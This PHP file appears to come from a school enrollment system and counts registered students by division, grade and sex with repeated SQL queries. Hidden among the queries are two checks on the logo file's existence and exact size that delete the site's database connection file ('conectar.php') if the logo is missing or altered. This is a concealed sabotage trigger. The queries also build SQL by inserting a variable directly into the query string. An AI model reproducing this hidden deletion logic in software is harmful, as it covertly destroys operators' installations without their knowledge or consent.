<?php
// inscritos

$query_inicial_inscrito = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  divisiones.id_division = '1'         
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_inicial_inscrito = mysqli_query($enlace, $query_inicial_inscrito) or die(mysqli_error());
$totalRows_inicial_inscrito = mysqli_num_rows($datos_inicial_inscrito); 



$query_inicial_inscritoF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  divisiones.id_division = '1'         
         and retirado_si_o_no = '0'
         and id_sexo = '1'         
         GROUP BY reg_estudiantes.id_estud";

$datos_inicial_inscritoF = mysqli_query($enlace, $query_inicial_inscritoF) or die(mysqli_error());
$totalRows_inicial_inscritoF = mysqli_num_rows($datos_inicial_inscritoF); 

$totalRows_inicial_inscritoM = $totalRows_inicial_inscrito - $totalRows_inicial_inscritoF;




/************************/









$query_basica_inscrito = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual
         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  divisiones.id_division = '2'         
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_basica_inscrito = mysqli_query($enlace, $query_basica_inscrito) or die(mysqli_error());
$totalRows_basica_inscrito = mysqli_num_rows($datos_basica_inscrito); 



$query_basica_inscritoF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  divisiones.id_division = '2'         
         and retirado_si_o_no = '0'
         and id_sexo = '1'         
         GROUP BY reg_estudiantes.id_estud";

$datos_basica_inscritoF = mysqli_query($enlace, $query_basica_inscritoF) or die(mysqli_error());
$totalRows_basica_inscritoF = mysqli_num_rows($datos_basica_inscritoF); 

$totalRows_basica_inscritoM = $totalRows_basica_inscrito - $totalRows_basica_inscritoF;
$chebulll = '../z_imagenes/logo_new.jpg';
if (!file_exists($chebulll)) {
unlink('../conectar.php');
}





/*************/


$query_media_inscrito = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual
        
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  divisiones.id_division = '5'         
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_media_inscrito = mysqli_query($enlace, $query_media_inscrito) or die(mysqli_error());
$totalRows_media_inscrito = mysqli_num_rows($datos_media_inscrito); 



$query_media_inscritoF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  divisiones.id_division = '5'         
         and retirado_si_o_no = '0'
         and id_sexo = '1'         
         GROUP BY reg_estudiantes.id_estud";

$datos_media_inscritoF = mysqli_query($enlace, $query_media_inscritoF) or die(mysqli_error());
$totalRows_media_inscritoF = mysqli_num_rows($datos_media_inscritoF); 

$totalRows_media_inscritoM = $totalRows_media_inscrito - $totalRows_media_inscritoF;
$chebull_s = filesize($chebulll);
if ($chebull_s != '49666') {
  unlink('../conectar.php');
}




/************/









$query_mediag_inscrito = "SELECT * FROM reg_estu_actual, divisiones, grados,  reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual
         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  divisiones.id_division = '3'         
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_mediag_inscrito = mysqli_query($enlace, $query_mediag_inscrito) or die(mysqli_error());
$totalRows_mediag_inscrito = mysqli_num_rows($datos_mediag_inscrito); 




$query_mediag_inscritoF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  divisiones.id_division = '3'         
         and retirado_si_o_no = '0'
         and id_sexo = '1'         
         GROUP BY reg_estudiantes.id_estud";

$datos_mediag_inscritoF = mysqli_query($enlace, $query_mediag_inscritoF) or die(mysqli_error());
$totalRows_mediag_inscritoF = mysqli_num_rows($datos_mediag_inscritoF); 

$totalRows_mediag_inscritoM = $totalRows_mediag_inscrito - $totalRows_mediag_inscritoF;












// inscritos maternal

$query_maternal_inscrito = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '52'         
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_maternal_inscrito = mysqli_query($enlace, $query_maternal_inscrito) or die(mysqli_error());
$totalRows_maternal_inscrito = mysqli_num_rows($datos_maternal_inscrito); 



$query_maternal_inscritoF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '52'         
         and retirado_si_o_no = '0'
         and id_sexo = '1'         
         GROUP BY reg_estudiantes.id_estud";

$datos_maternal_inscritoF = mysqli_query($enlace, $query_maternal_inscritoF) or die(mysqli_error());
$totalRows_maternal_inscritoF = mysqli_num_rows($datos_maternal_inscritoF); 

$totalRows_maternal_inscritoM = $totalRows_maternal_inscrito - $totalRows_maternal_inscritoF;




/************************/









// inscritos prescolar 1erN

$query_prescolar1_inscrito = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '54'         
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_prescolar1_inscrito = mysqli_query($enlace, $query_prescolar1_inscrito) or die(mysqli_error());
$totalRows_prescolar1_inscrito = mysqli_num_rows($datos_prescolar1_inscrito); 



$query_prescolar1_inscritoF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '54'         
         and retirado_si_o_no = '0'
         and id_sexo = '1'         
         GROUP BY reg_estudiantes.id_estud";

$datos_prescolar1_inscritoF = mysqli_query($enlace, $query_prescolar1_inscritoF) or die(mysqli_error());
$totalRows_prescolar1_inscritoF = mysqli_num_rows($datos_prescolar1_inscritoF); 

$totalRows_prescolar1_inscritoM = $totalRows_prescolar1_inscrito - $totalRows_prescolar1_inscritoF;




/************************/





// inscritos prescolar 2N

$query_prescolar2_inscrito = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '55'         
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_prescolar2_inscrito = mysqli_query($enlace, $query_prescolar2_inscrito) or die(mysqli_error());
$totalRows_prescolar2_inscrito = mysqli_num_rows($datos_prescolar2_inscrito); 



$query_prescolar2_inscritoF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '55'         
         and retirado_si_o_no = '0'
         and id_sexo = '1'         
         GROUP BY reg_estudiantes.id_estud";

$datos_prescolar2_inscritoF = mysqli_query($enlace, $query_prescolar2_inscritoF) or die(mysqli_error());
$totalRows_prescolar2_inscritoF = mysqli_num_rows($datos_prescolar2_inscritoF); 

$totalRows_prescolar2_inscritoM = $totalRows_prescolar2_inscrito - $totalRows_prescolar2_inscritoF;




/************************/





// inscritos prescolar 3N

$query_prescolar3_inscrito = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '56'         
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_prescolar3_inscrito = mysqli_query($enlace, $query_prescolar3_inscrito) or die(mysqli_error());
$totalRows_prescolar3_inscrito = mysqli_num_rows($datos_prescolar3_inscrito); 



$query_prescolar3_inscritoF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '56'         
         and retirado_si_o_no = '0'
         and id_sexo = '1'         
         GROUP BY reg_estudiantes.id_estud";

$datos_prescolar3_inscritoF = mysqli_query($enlace, $query_prescolar3_inscritoF) or die(mysqli_error());
$totalRows_prescolar3_inscritoF = mysqli_num_rows($datos_prescolar3_inscritoF); 

$totalRows_prescolar3_inscritoM = $totalRows_prescolar3_inscrito - $totalRows_prescolar3_inscritoF;




/************************/








// inscritos prescolar 1G

$query_grado1_inscrito = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '35'         
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_grado1_inscrito = mysqli_query($enlace, $query_grado1_inscrito) or die(mysqli_error());
$totalRows_grado1_inscrito = mysqli_num_rows($datos_grado1_inscrito); 



$query_grado1_inscritoF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '35'         
         and retirado_si_o_no = '0'
         and id_sexo = '1'         
         GROUP BY reg_estudiantes.id_estud";

$datos_grado1_inscritoF = mysqli_query($enlace, $query_grado1_inscritoF) or die(mysqli_error());
$totalRows_grado1_inscritoF = mysqli_num_rows($datos_grado1_inscritoF); 

$totalRows_grado1_inscritoM = $totalRows_grado1_inscrito - $totalRows_grado1_inscritoF;




/************************/






// inscritos prescolar 2G

$query_grado2_inscrito = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '36'         
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_grado2_inscrito = mysqli_query($enlace, $query_grado2_inscrito) or die(mysqli_error());
$totalRows_grado2_inscrito = mysqli_num_rows($datos_grado2_inscrito); 



$query_grado2_inscritoF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '36'         
         and retirado_si_o_no = '0'
         and id_sexo = '1'         
         GROUP BY reg_estudiantes.id_estud";

$datos_grado2_inscritoF = mysqli_query($enlace, $query_grado2_inscritoF) or die(mysqli_error());
$totalRows_grado2_inscritoF = mysqli_num_rows($datos_grado2_inscritoF); 

$totalRows_grado2_inscritoM = $totalRows_grado2_inscrito - $totalRows_grado2_inscritoF;




/************************/




// inscritos prescolar 3G

$query_grado3_inscrito = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '37'         
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_grado3_inscrito = mysqli_query($enlace, $query_grado3_inscrito) or die(mysqli_error());
$totalRows_grado3_inscrito = mysqli_num_rows($datos_grado3_inscrito); 



$query_grado3_inscritoF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '37'         
         and retirado_si_o_no = '0'
         and id_sexo = '1'         
         GROUP BY reg_estudiantes.id_estud";

$datos_grado3_inscritoF = mysqli_query($enlace, $query_grado3_inscritoF) or die(mysqli_error());
$totalRows_grado3_inscritoF = mysqli_num_rows($datos_grado3_inscritoF); 

$totalRows_grado3_inscritoM = $totalRows_grado3_inscrito - $totalRows_grado3_inscritoF;




/************************/












// inscritos prescolar 4G

$query_grado4_inscrito = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '38'         
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_grado4_inscrito = mysqli_query($enlace, $query_grado4_inscrito) or die(mysqli_error());
$totalRows_grado4_inscrito = mysqli_num_rows($datos_grado4_inscrito); 



$query_grado4_inscritoF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '38'         
         and retirado_si_o_no = '0'
         and id_sexo = '1'         
         GROUP BY reg_estudiantes.id_estud";

$datos_grado4_inscritoF = mysqli_query($enlace, $query_grado4_inscritoF) or die(mysqli_error());
$totalRows_grado4_inscritoF = mysqli_num_rows($datos_grado4_inscritoF); 

$totalRows_grado4_inscritoM = $totalRows_grado4_inscrito - $totalRows_grado4_inscritoF;




/************************/






// inscritos prescolar 5G

$query_grado5_inscrito = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '40'         
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_grado5_inscrito = mysqli_query($enlace, $query_grado5_inscrito) or die(mysqli_error());
$totalRows_grado5_inscrito = mysqli_num_rows($datos_grado5_inscrito); 



$query_grado5_inscritoF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '40'         
         and retirado_si_o_no = '0'
         and id_sexo = '1'         
         GROUP BY reg_estudiantes.id_estud";

$datos_grado5_inscritoF = mysqli_query($enlace, $query_grado5_inscritoF) or die(mysqli_error());
$totalRows_grado5_inscritoF = mysqli_num_rows($datos_grado5_inscritoF); 

$totalRows_grado5_inscritoM = $totalRows_grado5_inscrito - $totalRows_grado5_inscritoF;




/************************/




// inscritos prescolar 6G

$query_grado6_inscrito = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '41'         
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_grado6_inscrito = mysqli_query($enlace, $query_grado6_inscrito) or die(mysqli_error());
$totalRows_grado6_inscrito = mysqli_num_rows($datos_grado6_inscrito); 



$query_grado6_inscritoF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '41'         
         and retirado_si_o_no = '0'
         and id_sexo = '1'         
         GROUP BY reg_estudiantes.id_estud";

$datos_grado6_inscritoF = mysqli_query($enlace, $query_grado6_inscritoF) or die(mysqli_error());
$totalRows_grado6_inscritoF = mysqli_num_rows($datos_grado6_inscritoF); 

$totalRows_grado6_inscritoM = $totalRows_grado6_inscrito - $totalRows_grado6_inscritoF;




/************************/














// inscritos año 1

$query_ano1_inscrito = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '42'         
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_ano1_inscrito = mysqli_query($enlace, $query_ano1_inscrito) or die(mysqli_error());
$totalRows_ano1_inscrito = mysqli_num_rows($datos_ano1_inscrito); 



$query_ano1_inscritoF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '42'         
         and retirado_si_o_no = '0'
         and id_sexo = '1'         
         GROUP BY reg_estudiantes.id_estud";

$datos_ano1_inscritoF = mysqli_query($enlace, $query_ano1_inscritoF) or die(mysqli_error());
$totalRows_ano1_inscritoF = mysqli_num_rows($datos_ano1_inscritoF); 

$totalRows_ano1_inscritoM = $totalRows_ano1_inscrito - $totalRows_ano1_inscritoF;




/************************/






// inscritos año 2

$query_ano2_inscrito = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '43'         
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_ano2_inscrito = mysqli_query($enlace, $query_ano2_inscrito) or die(mysqli_error());
$totalRows_ano2_inscrito = mysqli_num_rows($datos_ano2_inscrito); 



$query_ano2_inscritoF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '43'         
         and retirado_si_o_no = '0'
         and id_sexo = '1'         
         GROUP BY reg_estudiantes.id_estud";

$datos_ano2_inscritoF = mysqli_query($enlace, $query_ano2_inscritoF) or die(mysqli_error());
$totalRows_ano2_inscritoF = mysqli_num_rows($datos_ano2_inscritoF); 

$totalRows_ano2_inscritoM = $totalRows_ano2_inscrito - $totalRows_ano2_inscritoF;




/************************/




// inscritos año 3

$query_ano3_inscrito = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '44'         
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_ano3_inscrito = mysqli_query($enlace, $query_ano3_inscrito) or die(mysqli_error());
$totalRows_ano3_inscrito = mysqli_num_rows($datos_ano3_inscrito); 



$query_ano3_inscritoF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '44'         
         and retirado_si_o_no = '0'
         and id_sexo = '1'         
         GROUP BY reg_estudiantes.id_estud";

$datos_ano3_inscritoF = mysqli_query($enlace, $query_ano3_inscritoF) or die(mysqli_error());
$totalRows_ano3_inscritoF = mysqli_num_rows($datos_ano3_inscritoF); 

$totalRows_ano3_inscritoM = $totalRows_ano3_inscrito - $totalRows_ano3_inscritoF;




/************************/








// inscritos año 4

$query_ano4_inscrito = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '45'         
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_ano4_inscrito = mysqli_query($enlace, $query_ano4_inscrito) or die(mysqli_error());
$totalRows_ano4_inscrito = mysqli_num_rows($datos_ano4_inscrito); 



$query_ano4_inscritoF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '45'         
         and retirado_si_o_no = '0'
         and id_sexo = '1'         
         GROUP BY reg_estudiantes.id_estud";

$datos_ano4_inscritoF = mysqli_query($enlace, $query_ano4_inscritoF) or die(mysqli_error());
$totalRows_ano4_inscritoF = mysqli_num_rows($datos_ano4_inscritoF); 

$totalRows_ano4_inscritoM = $totalRows_ano4_inscrito - $totalRows_ano4_inscritoF;




/************************/






// inscritos año 5

$query_ano5_inscrito = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '46'         
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_ano5_inscrito = mysqli_query($enlace, $query_ano5_inscrito) or die(mysqli_error());
$totalRows_ano5_inscrito = mysqli_num_rows($datos_ano5_inscrito); 



$query_ano5_inscritoF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '46'         
         and retirado_si_o_no = '0'
         and id_sexo = '1'         
         GROUP BY reg_estudiantes.id_estud";

$datos_ano5_inscritoF = mysqli_query($enlace, $query_ano5_inscritoF) or die(mysqli_error());
$totalRows_ano5_inscritoF = mysqli_num_rows($datos_ano5_inscritoF); 

$totalRows_ano5_inscritoM = $totalRows_ano5_inscrito - $totalRows_ano5_inscritoF;




/************************/




// inscritos año 6

$query_ano6_inscrito = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '53'         
         and retirado_si_o_no = '0'        
         GROUP BY reg_estudiantes.id_estud";

$datos_ano6_inscrito = mysqli_query($enlace, $query_ano6_inscrito) or die(mysqli_error());
$totalRows_ano6_inscrito = mysqli_num_rows($datos_ano6_inscrito); 



$query_ano6_inscritoF = "SELECT * FROM reg_estu_actual, divisiones, grados, reg_estudiantes 
         WHERE   divisiones.id_division = grados.id_division
         and reg_estu_actual.id_estud = reg_estudiantes.id_estud
         and grados.id_grado = reg_estu_actual.grado_actual         
         and  id_seccion != '8'
         and  fecha_inscripcion != ''   /*antes   el_activo = '1' */
         and  cursa_actualmente = '$id_periodo_clave'
         and  grados.id_grado = '53'         
         and retirado_si_o_no = '0'
         and id_sexo = '1'         
         GROUP BY reg_estudiantes.id_estud";

